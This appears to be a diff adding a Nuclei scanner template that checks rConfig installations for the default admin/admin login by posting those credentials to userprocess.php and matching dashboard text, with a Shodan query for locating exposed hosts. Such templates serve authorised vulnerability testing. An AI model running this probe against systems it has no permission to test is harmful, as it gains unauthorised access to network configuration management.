@@ -1,0 +1,60 @@
+id: rconfig-default-login
+
+info:
+  name: rConfig - Default Login
+  author: theamanrawat
+  severity: high
+  description: |
+    rConfig contains default credentials. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
+  reference:
+    - https://github.com/rconfig/rconfig
+  classification:
+    cpe: cpe:2.3:a:rconfig:rconfig:*:*:*:*:*:*:*:*
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: rconfig
+    product: rconfig
+    shodan-query: http.title:"rConfig"
+  tags: rconfig,default-login,vuln
+
+http:
+  - raw:
+      - |
+        GET /login.php HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /lib/crud/userprocess.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        user={{username}}&pass={{password}}&sublogin=1
+
+    attack: pitchfork
+    payloads:
+      username:
+        - "admin"
+      password:
+        - "admin"
+    host-redirects: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - "Logged in as"
+          - "rConfig - Configuration Management"
+          - "dashboadFieldSet"
+        condition: and
+
+      - type: word
+        part: header_2
+        words:
+          - text/html
+
+      - type: status
+        part: header_2
+        status:
+          - 200
+# digest: 4a0a00473045022100f797f3bef2cfb171176a065d6e7642a3885b3a2b71d0c0da9c2a6eb3df91886e02200d9d8894856d68c8d475e97b5afb4cd2de313dabf4059ef526186c2320377e9a:922c64590222798bb761d5b6d8e72950
